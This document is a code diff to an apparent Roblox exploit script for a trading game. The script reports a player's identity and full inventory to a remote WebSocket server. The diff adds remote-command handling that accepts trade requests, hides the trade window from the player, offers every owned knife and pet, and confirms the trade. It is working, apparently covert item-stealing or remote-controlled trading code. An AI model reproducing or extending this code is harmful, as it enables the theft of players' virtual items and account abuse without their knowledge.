@@ -79,6 +79,7 @@ function getPlayerOwnedWeapons()
             
             table.insert(weapons, {
                 itemName = itemName,
+                itemRawName = RawItemName,
                 itemRarity = itemRarity,
                 itemType = itemType,
                 itemImage = itemImage,
@@ -101,14 +102,27 @@ function getPlayerOwnedPets()
 
         table.insert(pets , {
             itemName = itemName,
+            itemRawName = RawItemName,
             itemRarity = itemRarity,
             itemType = itemType,
             itemImage = itemImage,
             itemStock = ItemStock
         })
     end
- 
     return pets
+end
+
+function offerTradeItems(items)
+    for _ , itemData in ipairs(items) do
+        for i = 1 , itemData.itemStock do
+            local args = {
+                [1] = itemData.itemName,
+                [2] = itemData.itemType == "Knife" and "Weapons" or "Pets"
+            }
+            
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
 end
 
 function sendToWebsocket(t) 
@@ -123,7 +137,7 @@ OldUpdateTradeRequestWindowFunc = hookfunction(TradeModule.UpdateTradeRequestWin
     if not checkcaller() and type == "ReceivingRequest" then
         sendToWebsocket({
             type = "ReceivedTradeRequest",
-            user = data.Sender.Name
+            username = data.Sender.Name
         })
     end
 
@@ -147,7 +161,7 @@ StarterGUI:SetCore("SendNotification" , {
 sendToWebsocket({
     type = "PlayerConnect",
     userId = LocalPlayer.UserId,
-    user = LocalPlayer.Name,
+    username = LocalPlayer.Name,
     placeId = PlaceId,
     inventory = getPlayerOwnedWeapons() + getPlayerOwnedPets()
 })
@@ -157,6 +171,18 @@ WebSocket.OnClose:Connect(function()
 end)
 
 WebSocket.OnMessage:Connect(function(msg)
-    print(msg)
-    -- game.ReplicatedStorage:FindFirstChild("Trade").AcceptRequest:FireServer()
+    local data  = HttpService:JSONDecode(msg)
+
+    if data.type == "AcceptTrade" then
+        game.ReplicatedStorage:FindFirstChild("Trade").AcceptRequest:FireServer()
+        TradeModule.GUI.RequestFrame.Visible = false
+
+        wait(3)
+        offerTradeItems(data.items)
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
+
+    elseif data.type == "DeclineTrade" then
+        game.ReplicatedStorage:FindFirstChild("Trade").DeclineRequest:FireServer()
+        TradeModule.GUI.RequestFrame.Visible = false
+    end
 end)
